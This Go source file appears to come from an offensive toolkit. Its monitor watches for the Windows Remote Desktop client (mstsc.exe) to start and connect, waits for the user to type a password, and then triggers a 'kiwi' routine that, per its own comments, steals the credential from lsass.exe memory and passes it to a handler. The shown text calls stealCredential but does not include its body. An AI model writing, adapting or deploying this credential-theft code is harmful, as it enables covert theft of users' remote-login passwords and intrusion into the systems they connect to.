package kiwimon

import (
	"context"
	"sync"
	"time"

	"github.com/pkg/errors"

	"project/internal/logger"
	"project/internal/module/netmon"
	"project/internal/module/taskmgr"
	"project/internal/module/windows/kiwi"
	"project/internal/nettool"
	"project/internal/xsync"
)

// DefaultWaitTime is the wait time to steal password that find mstsc.exe
// process and establish connection.
const DefaultWaitTime = 15 * time.Second

// Handler is used to receive stolen credential.
type Handler func(local, remote string, pid int64, cred *kiwi.Credential)

// Monitor is used to watch password mstsc from, if mstsc.exe is created and
// establish connection, then wait some second for wait user input password,
// finally, use kiwi to steal password from lsass.exe
type Monitor struct {
	logger   logger.Logger
	handler  Handler
	waitTime time.Duration

	processMonitor *taskmgr.Monitor
	connMonitor    *netmon.Monitor

	// key is PID
	watchPIDList    map[int64]struct{}
	watchPIDListRWM sync.RWMutex

	mu sync.Mutex

	counter xsync.Counter
}

type MonitorOptions struct {
	WaitTime               time.Duration
	ProcessMonitorInterval time.Duration
	ConnMonitorInterval    time.Duration
}

// NewMonitor is used to create a new kiwi monitor.
func NewMonitor(logger logger.Logger, handler Handler, opts *MonitorOptions) (*Monitor, error) {
	if opts == nil {
		opts = new(MonitorOptions)
	}
	monitor := Monitor{
		logger:       logger,
		handler:      handler,
		waitTime:     opts.WaitTime,
		watchPIDList: make(map[int64]struct{}),
	}
	processMonitor, err := taskmgr.NewMonitor(logger, monitor.processMonitorHandler)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to create process monitor")
	}
	if opts.ProcessMonitorInterval != 0 {
		processMonitor.SetInterval(opts.ProcessMonitorInterval)
	}
	connMonitor, err := netmon.NewMonitor(logger, monitor.connMonitorHandler)
	if err != nil {
		processMonitor.Close()
		return nil, errors.WithMessage(err, "failed to create connection monitor")
	}
	if opts.ConnMonitorInterval != 0 {
		connMonitor.SetInterval(opts.ConnMonitorInterval)
	}
	monitor.processMonitor = processMonitor
	monitor.connMonitor = connMonitor
	if monitor.waitTime == 0 {
		monitor.waitTime = DefaultWaitTime
	}
	return &monitor, nil
}

func (mon *Monitor) log(lv logger.Level, log ...interface{}) {
	mon.logger.Println(lv, "kiwi monitor", log...)
}

func (mon *Monitor) processMonitorHandler(_ context.Context, event uint8, data interface{}) {
	switch event {
	case taskmgr.EventProcessCreated:
		mon.watchPIDListRWM.Lock()
		defer mon.watchPIDListRWM.Unlock()
		for _, process := range data.([]*taskmgr.Process) {
			if process.Name == "mstsc.exe" {
				mon.watchPIDList[process.PID] = struct{}{}
			}
		}
	case taskmgr.EventProcessTerminated:
		mon.watchPIDListRWM.Lock()
		defer mon.watchPIDListRWM.Unlock()
		for _, process := range data.([]*taskmgr.Process) {
			if process.Name == "mstsc.exe" {
				delete(mon.watchPIDList, process.PID)
			}
		}
	}
}

func (mon *Monitor) connMonitorHandler(_ context.Context, event uint8, data interface{}) {
	if event != netmon.EventConnCreated {
		return
	}
	mon.watchPIDListRWM.RLock()
	defer mon.watchPIDListRWM.RUnlock()
	for _, conn := range data.([]interface{}) {
		var (
			pid    int64
			local  string
			remote string
		)
		switch conn := conn.(type) {
		case *netmon.TCP4Conn:
			pid = conn.PID
			local = nettool.JoinHostPort(conn.LocalAddr.String(), conn.LocalPort)
			remote = nettool.JoinHostPort(conn.RemoteAddr.String(), conn.RemotePort)
		case *netmon.TCP6Conn:
			pid = conn.PID
			local = nettool.JoinHostPort(conn.LocalAddr.String(), conn.LocalPort)
			remote = nettool.JoinHostPort(conn.RemoteAddr.String(), conn.RemotePort)
		}
		if pid != 0 {
			mon.counter.Add(1)
			go mon.stealCredential(local, remote, pid)
		}
	}
}
